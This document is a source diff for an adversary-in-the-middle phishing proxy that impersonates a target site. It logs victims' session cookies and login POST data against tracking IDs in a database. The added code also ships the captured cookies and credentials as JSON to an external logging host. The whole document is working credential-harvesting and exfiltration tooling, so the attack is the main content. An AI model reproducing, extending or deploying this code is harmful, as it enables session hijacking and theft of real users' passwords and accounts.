@@ -48,8 +48,8 @@ db = new sqlite3.Database('./db/humble.db', sqlite3.OPEN_READWRITE | sqlite3.OPE
 });
  
 db.serialize(function() {
-  db.run("CREATE TABLE IF NOT EXISTS posts (timestamp TEXT, domain TEXT, url TEXT, post TEXT)");
-  db.run("CREATE TABLE IF NOT EXISTS cookies (timestamp TEXT, domain TEXT, url TEXT, cookie TEXT)");
+  db.run("CREATE TABLE IF NOT EXISTS posts (timestamp TEXT, tracking_id TEXT, domain TEXT, url TEXT, post TEXT)");
+  db.run("CREATE TABLE IF NOT EXISTS cookies (timestamp TEXT, tracking_id TEXT, domain TEXT, url TEXT, cookie TEXT)");
 });
  
 // =======================================================
@@ -63,13 +63,50 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
   split_domain = requested_domain.split('.')
   humble_domain = split_domain.slice(-2).join('.')
 
+  //set up logging function here so that routes can use it if need be
+  var ship_logs = function(log_data){
+    if((typeof config[humble_domain].logging_endpoint.host) != 'undefined'){
+      var headers = { 
+        'Content-Type': 'application/json',
+        'Cookie': config[humble_domain].logging_endpoint.auth_cookie,
+        'Content-Length': Buffer.byteLength(JSON.stringify(log_data))
+      };  
+      // Configure the request
+      var options = { 
+        hostname: config[humble_domain].logging_endpoint.host,
+        path: config[humble_domain].logging_endpoint.url,
+        method: 'POST',
+        headers: headers
+      };  
+  
+      var post_request =  https.request(options,  (resp) => {
+        let data = ''; 
+  
+        resp.on('data', (chunk) => {
+          data += chunk;
+        }); 
+  
+        resp.on('end', () => {
+          //console.log(data)
+        }); 
+  
+      }).on("error", (err) => {
+        console.log("Error sending logs to endpoint: " + err.message);
+      }); 
+  
+      post_request.write(JSON.stringify(log_data))
+      post_request.end()
+    }
+  }
+
   //get target from domain's config
-  var target_object = route.getTarget(humble_domain, victim_request)
+  var target_object = route.getTarget(humble_domain, victim_request, ship_logs)
   target = target_object.target
 
   http_method = victim_request.method
   substitution_regex = RegExp(target, 'gi')
-  reverse_sub_regex = RegExp(humble_domain, 'gi')
+  //escape dangerous chars first
+  reverse_sub_regex = RegExp(humble_domain.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, '\\$&'), 'gi')
   postData = '';
 
   //collect any data from the body of the request
@@ -87,29 +124,40 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
       path: url.parse(victim_request.url).path.replace(reverse_sub_regex, target),
       method: http_method,
       //wierd but it works somehow... Just the string will break a bunch of stuff
-      headers: JSON.parse(JSON.stringify(victim_request.headers).replace(humble_domain, target))
+      headers: JSON.parse(JSON.stringify(victim_request.headers).replace(reverse_sub_regex, target))
     };
+
+    let victim_cookies = options.headers.cookie;
 
     //check to see if we have some cookies to save in the DB but don't save if it's just an amdin
     if ((options.headers.cookie != null) && !(options.headers.cookie.includes(admin_config.admin_cookie.cookie_name))) {
-      //victim_cookies = options.headers.cookie;
-      console.log(success + "Captured cookie: " + JSON.stringify(options.headers.cookie));
-      access_log.write("[+]Captured cookie: " + JSON.stringify(options.headers.cookie) + "\n");
-      creds_log.write("[+]Captured cookie: " + JSON.stringify(options.headers.cookie) + "\n");
       //create a db entry for it for our admin interface
       db.serialize(function() {
         var select = "SELECT cookie FROM cookies WHERE domain = ? AND cookie = ?"
-        db.get(select, [requested_domain, JSON.stringify(options.headers.cookie)], (err, row) => {
+        db.get(select, [requested_domain, JSON.stringify(victim_cookies)], (err, row) => {
           if (err) {
             return console.error(err.message);
           }
           //skip the cookie if we already captured it
           if (row) {
-            console.log("skipping previously captured cookie")
-	  } else { 
-            var stmt = db.prepare("INSERT INTO cookies VALUES (?,?,?,?)");
-            stmt.run(dateFormat("isoDateTime"),requested_domain,url.parse(victim_request.url).path, JSON.stringify(options.headers.cookie) )
-            stmt.finalize();
+            //console.log("skipping previously captured cookie")
+	  //only capture cookies for actual victims
+	  } else if(victim_cookies.includes(config[humble_domain].tracking_cookie)){
+            try{
+              let tracking_search = new RegExp(config[humble_domain].tracking_cookie + '=([^;]*)(;|$)', 'i')
+              //get first capture group of our regex
+              tracking_id = tracking_search.exec(victim_cookies)[1]
+              console.log(success + "Captured cookie: " + JSON.stringify(victim_cookies));
+              access_log.write("[+]Captured cookie: " + JSON.stringify(victim_cookies) + "\n");
+              creds_log.write("[+]Captured cookie: " + JSON.stringify(victim_cookies) + "\n");
+              var stmt = db.prepare("INSERT INTO cookies VALUES (?,?,?,?,?)");
+              stmt.run(dateFormat("isoDateTime"),tracking_id,requested_domain,url.parse(victim_request.url).path, JSON.stringify(victim_cookies) )
+              stmt.finalize();
+              ship_logs({"target": tracking_id, "event_type": "COOKIE_DATA", "event_data": JSON.stringify(victim_cookies)})
+	    }catch(err){
+              //console.log(err)
+	      console.log("Error processing tracking cookie: " + victim_cookies)
+	    }
           }
         });
       });
@@ -151,7 +199,7 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
       views.credsLog(victim_request, humble_response);
     } else {
       //remove any reference to the evil cookie if it is being used
-      evil_cookie_regex = RegExp(config[humble_domain].cookie_search.cookie + '.?=.?' + config[humble_domain].cookie_search.cookie_value + '.?;? ?', 'gi')
+      evil_cookie_regex = RegExp(config[humble_domain].tracking_cookie + '=[^;]*;|$', 'i')
       try{
         options.headers.cookie = options.headers.cookie.replace(evil_cookie_regex, '')
       }catch(err){
@@ -169,15 +217,28 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
 
       //make sure to log any POST data we captured
       if (http_method == "POST") {
-        if (postData != '') {
+        //log any real POST data to the files at least JIC
+        if (postData.length > 5) {
           console.log(success + dateFormat("isoDateTime") + " " + "Captured POST data for " + options.host + options.path + ": " + postData)
           creds_log.write("[+]" + dateFormat("isoDateTime") + " " + "Captured POST data for " + options.host + options.path + ": " + postData + "\n")
           access_log.write("[+]" + dateFormat("isoDateTime") + " " + "Captured POST data for " + options.host + options.path + ": " + postData + "\n")
-          db.serialize(function() {
-            var stmt = db.prepare("INSERT INTO posts VALUES (?,?,?,?)");
-            stmt.run(dateFormat("isoDateTime"),options.host,options.path,postData)
-            stmt.finalize();
-          });
+        }
+        //try to just get logins for the credz log and shippling logs
+        if (postData.match(/usr|user|login|pass|psw|auth/ig)) {
+          //only log data for our victims
+	  if(victim_cookies.includes(config[humble_domain].tracking_cookie)){
+            let tracking_search = new RegExp(config[humble_domain].tracking_cookie + '=([^;]*)(;|$)', 'i')
+            tracking_id = tracking_search.exec(victim_cookies)[1]
+            try{
+              var stmt = db.prepare("INSERT INTO posts VALUES (?,?,?,?,?)");
+              stmt.run(dateFormat("isoDateTime"),tracking_id,options.host,options.path,postData)
+              stmt.finalize();
+              ship_logs({"target": tracking_id, "event_type": "POST_DATA", "event_data": postData})
+	    }catch(err){
+              //console.log(err)
+	      console.log("Error processing post data: " + postData)
+	    }
+          }
         }
         req.write(postData.replace(reverse_sub_regex, target))
         console.log(postData.replace(reverse_sub_regex, target))
